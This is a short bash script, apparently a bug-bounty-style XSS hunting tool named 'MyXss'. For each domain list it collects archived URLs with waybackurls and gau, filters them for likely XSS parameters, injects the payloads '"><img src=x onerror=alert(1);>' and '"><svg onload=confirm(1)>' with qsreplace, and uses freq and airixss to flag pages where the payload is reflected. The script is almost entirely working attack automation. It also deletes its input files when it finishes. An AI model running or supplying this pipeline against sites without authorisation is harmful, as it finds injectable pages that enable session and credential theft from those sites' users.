#!/bin/bash


echo "**************************************"
echo "*      __  __      __  __            *"
echo "*     |  \/  |_   _\ \/ /___ ___     *"
echo "*     | |\/| | | | |\  // __/ __|    *"
echo "*     | |  | | |_| |/  \\__ \__ \    *"
echo "*     |_|  |_|\__, /_/\_\___/___/    *"
echo "*             |___/                  *"
echo "*                                    *"
echo "**************************************"


for domains in *.txt
do
echo ""
echo "**********"
echo "${domains} in progress"

folder=${domains%.txt}

mkdir $folder

cd $folder

cat ../${domains} | waybackurls | gf xss | httpx -silent | uro > waybackurls.txt 
cat ../${domains} | gau | gf xss | httpx -silent | uro > gau.txt 

cat waybackurls.txt gau.txt | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | grep "31m" > freq.txt 

cat waybackurls.txt gau.txt | uro | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | grep "31m" > airxss.txt

sudo rm waybackurls.txt
sudo rm gau.txt

echo ""
echo "${domains} : was successfully"


cd ../

done

rm *.txt 


echo "***********************************"
echo "*                                 *"
echo "*           Finished              *"
echo "*                                 *"
echo "***********************************"

